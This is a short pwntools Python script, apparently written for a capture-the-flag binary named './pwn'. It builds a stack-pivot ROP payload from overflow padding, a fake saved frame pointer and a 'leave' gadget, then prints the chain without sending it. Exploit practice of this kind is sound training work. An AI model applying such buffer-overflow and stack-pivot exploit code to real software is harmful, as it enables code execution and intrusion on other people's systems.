from pwn import *
from pwn import p64,u64

elf = ELF('./pwn')
payload = ROP(elf)
payload.raw(b'A'* 0x30 + p64(0x004050A0 -8)+p64(payload.leave[0]))

# payload.migrate() #pop rbp
info(payload.dump())
